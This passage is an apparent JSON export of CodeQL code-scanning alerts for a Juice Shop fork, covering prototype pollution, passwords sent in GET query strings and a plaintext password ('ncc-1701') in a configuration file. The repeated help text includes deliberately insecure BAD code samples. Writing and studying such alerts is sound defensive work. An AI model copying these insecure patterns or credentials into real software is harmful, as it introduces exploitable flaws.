file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"dismissed","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'ncc-1701' in configuration file."},"location":{"path":"data/static/users.yml","start_line":31,"end_line":31,"start_column":13,"end_column":23},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/95/instances","dismissal_approved_by":null},{"number":94,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-02-05T07:33:31Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/94","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/94","state":"dismissed","fixed_at":null,"dismissed_by":{"login":"anubhav2025","id":115610428,"node_id":"U_kgDOBuQTPA","avatar_url":"https://avatars.githubusercontent.com/u/115610428?v=4","gravatar_id":"","url":"https://api.github.com/users/anubhav2025","html_url":"https://github.com/anubhav2025","followers_url":"https://api.github.com/users/anubhav2025/followers","following_url":"https://api.github.com/users/anubhav2025/following{/other_user}","gists_url":"https://api.github.com/users/anubhav2025/gists{/gist_id}","starred_url":"https://api.github.com/users/anubhav2025/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/anubhav2025/subscriptions","organizations_url":"https://api.github.com/users/anubhav2025/orgs","repos_url":"https://api.github.com/users/anubhav2025/repos","events_url":"https://api.github.com/users/anubhav2025/events{/privacy}","received_events_url":"https://api.github.com/users/anubhav2025/received_events","type":"User","user_view_type":"public","site_admin":false},"dismissed_at":"2025-02-05T07:33:31Z","dismissed_reason":"false positive","dismissed_comment":null,"rule":{"id":"js/remote-property-injection","severity":"warning","description":"Remote property injection","name":"js/remote-property-injection","tags":["external/cwe/cwe-250","external/cwe/cwe-400","security"],"full_description":"Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.","help":"# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"dismissed","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."},"location":{"path":"routes/vulnCodeFixes.ts","start_line":39,"end_line":39,"start_column":13,"end_column":16},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/94/instances","dismissal_approved_by":null},{"number":93,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-02-13T04:06:53Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/93","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/93","state":"dismissed","fixed_at":null,"dismissed_by":{"login":"anubhav2025","id":115610428,"node_id":"U_kgDOBuQTPA","avatar_url":"https://avatars.githubusercontent.com/u/115610428?v=4","gravatar_id":"","url":"https://api.github.com/users/anubhav2025","html_url":"https://github.com/anubhav2025","followers_url":"https://api.github.com/users/anubhav2025/followers","following_url":"https://api.github.com/users/anubhav2025/following{/other_user}","gists_url":"https://api.github.com/users/anubhav2025/gists{/gist_id}","starred_url":"https://api.github.com/users/anubhav2025/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/anubhav2025/subscriptions","organizations_url":"https://api.github.com/users/anubhav2025/orgs","repos_url":"https://api.github.com/users/anubhav2025/repos","events_url":"https://api.github.com/users/anubhav2025/events{/privacy}","received_events_url":"https://api.github.com/users/anubhav2025/received_events","type":"User","user_view_type":"public","site_admin":false},"dismissed_at":"2025-02-13T04:06:53Z","dismissed_reason":"false positive","dismissed_comment":null,"rule":{"id":"js/remote-property-injection","severity":"warning","description":"Remote property injection","name":"js/remote-property-injection","tags":["external/cwe/cwe-250","external/cwe/cwe-400","security"],"full_description":"Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.","help":"# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"dismissed","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."},"location":{"path":"lib/insecurity.ts","start_line":77,"end_line":77,"start_column":16,"end_column":28},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/93/instances","dismissal_approved_by":null},{"number":92,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-02-05T07:21:02Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/92","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/92","state":"dismissed","fixed_at":null,"dismissed_by":{"login":"anubhav2025","id":115610428,"node_id":"U_kgDOBuQTPA","avatar_url":"https://avatars.githubusercontent.com/u/115610428?v=4","gravatar_id":"","url":"https://api.github.com/users/anubhav2025","html_url":"https://github.com/anubhav2025","followers_url":"https://api.github.com/users/anubhav2025/followers","following_url":"https://api.github.com/users/anubhav2025/following{/other_user}","gists_url":"https://api.github.com/users/anubhav2025/gists{/gist_id}","starred_url":"https://api.github.com/users/anubhav2025/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/anubhav2025/subscriptions","organizations_url":"https://api.github.com/users/anubhav2025/orgs","repos_url":"https://api.github.com/users/anubhav2025/repos","events_url":"https://api.github.com/users/anubhav2025/events{/privacy}","received_events_url":"https://api.github.com/users/anubhav2025/received_events","type":"User","user_view_type":"public","site_admin":false},"dismissed_at":"2025-02-05T07:21:02Z","dismissed_reason":"false positive","dismissed_comment":null,"rule":{"id":"js/remote-property-injection","severity":"warning","description":"Remote property injection","name":"js/remote-property-injection","tags":["external/cwe/cwe-250","external/cwe/cwe-400","security"],"full_description":"Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.","help":"# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"dismissed","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."},"location":{"path":"lib/insecurity.ts","start_line":76,"end_line":76,"start_column":19,"end_column":24},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/92/instances","dismissal_approved_by":null},{"number":91,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/91","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/91","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/remote-property-injection","severity":"warning","description":"Remote property injection","name":"js/remote-property-injection","tags":["external/cwe/cwe-250","external/cwe/cwe-400","security"],"full_description":"Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.","help":"# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"A property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value.\nA property name to write to depends on a user-provided value."},"location":{"path":"lib/accuracy.ts","start_line":63,"end_line":63,"start_column":12,"end_column":24},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/91/instances","dismissal_approved_by":null},{"number":90,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/90","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/90","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/remote-property-injection","severity":"warning","description":"Remote property injection","name":"js/remote-property-injection","tags":["external/cwe/cwe-250","external/cwe/cwe-400","security"],"full_description":"Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.","help":"# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will fail with a confusing message such as \"Function.prototype.toString is not generic\". If the application does not properly handle this error, this scenario may result in a serious denial-of-service attack. The fix is to prepend the user-controlled string with a marker character such as `$` which will prevent arbitrary property names from being overwritten.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = \"$\" + req.query.userControlled; // GOOD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\n\n## References\n* Prototype pollution attacks: [electron](https://github.com/electron/electron/pull/9287), [lodash](https://hackerone.com/reports/310443), [hoek](https://npmjs.com/advisories/566).\n* Penetration testing report: [ header name injection attack](http://seclists.org/pen-test/2009/Mar/67)\n* npm blog post: [ dangers of square bracket notation](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n* Common Weakness Enumeration: [CWE-250](https://cwe.mitre.org/data/definitions/250.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"A property name to write to depends on a user-provided value."},"location":{"path":"frontend/src/app/oauth/oauth.component.ts","start_line":60,"end_line":60,"start_column":14,"end_column":17},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/90/instances","dismissal_approved_by":null},{"number":89,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/89","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/89","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/sensitive-get-query","severity":"warning","description":"Sensitive data read from GET request","name":"js/sensitive-get-query","tags":["external/cwe/cwe-598","security"],"full_description":"Placing sensitive data in a GET request increases the risk of the data being exposed to an attacker.","help":"# Sensitive data read from GET request\nSensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.\n\n\n## Recommendation\nUse HTTP POST to send sensitive information as part of the request body; for example, as form data.\n\n\n## Example\nThe following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.\n\n\n```javascript\nconst express = require('express');\nconst app = express();\napp.use(require('body-parser').urlencoded({ extended: false }))\n\n// bad: sensitive information is read from query parameters\napp.get('/login1', (req, res) => {\n    const user = req.query.user;\n    const password = req.query.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n// good: sensitive information is read from post body\napp.post('/login2', (req, res) => {\n    const user = req.body.user;\n    const password = req.body.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n```\n\n## References\n* CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)\n* PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)\n* OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)\n* Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Route handler for GET requests uses query parameter as sensitive data."},"location":{"path":"routes/changePassword.ts","start_line":19,"end_line":19,"start_column":28,"end_column":40},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/89/instances","dismissal_approved_by":null},{"number":88,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/88","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/88","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/sensitive-get-query","severity":"warning","description":"Sensitive data read from GET request","name":"js/sensitive-get-query","tags":["external/cwe/cwe-598","security"],"full_description":"Placing sensitive data in a GET request increases the risk of the data being exposed to an attacker.","help":"# Sensitive data read from GET request\nSensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.\n\n\n## Recommendation\nUse HTTP POST to send sensitive information as part of the request body; for example, as form data.\n\n\n## Example\nThe following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.\n\n\n```javascript\nconst express = require('express');\nconst app = express();\napp.use(require('body-parser').urlencoded({ extended: false }))\n\n// bad: sensitive information is read from query parameters\napp.get('/login1', (req, res) => {\n    const user = req.query.user;\n    const password = req.query.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n// good: sensitive information is read from post body\napp.post('/login2', (req, res) => {\n    const user = req.body.user;\n    const password = req.body.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n```\n\n## References\n* CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)\n* PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)\n* OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)\n* Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Route handler for GET requests uses query parameter as sensitive data."},"location":{"path":"routes/changePassword.ts","start_line":17,"end_line":17,"start_column":25,"end_column":34},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/88/instances","dismissal_approved_by":null},{"number":87,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/87","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/87","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/sensitive-get-query","severity":"warning","description":"Sensitive data read from GET request","name":"js/sensitive-get-query","tags":["external/cwe/cwe-598","security"],"full_description":"Placing sensitive data in a GET request increases the risk of the data being exposed to an attacker.","help":"# Sensitive data read from GET request\nSensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.\n\n\n## Recommendation\nUse HTTP POST to send sensitive information as part of the request body; for example, as form data.\n\n\n## Example\nThe following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.\n\n\n```javascript\nconst express = require('express');\nconst app = 